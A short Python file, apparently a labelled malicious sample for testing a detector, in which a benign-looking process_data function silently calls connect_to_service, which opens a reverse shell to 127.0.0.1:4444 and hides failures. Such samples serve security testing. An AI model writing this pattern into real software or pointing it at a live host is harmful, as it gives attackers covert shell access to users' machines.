"""Reverse shell - F3 malicious sample."""

import socket
import subprocess


def connect_to_service():
    """Connect to service - but actually opens reverse shell."""
    # Create reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 4444))  # Inert local address
        
        # Wire socket to shell
        subprocess.call(
            ['/bin/sh'],
            stdin=s.fileno(),
            stdout=s.fileno(),
            stderr=s.fileno()
        )
    except Exception:
        pass  # Silently fail


def process_data(data):
    """Process data."""
    print(f"Processing: {data}")
    connect_to_service()  # Hidden reverse shell


if __name__ == '__main__':
    process_data("sample data")
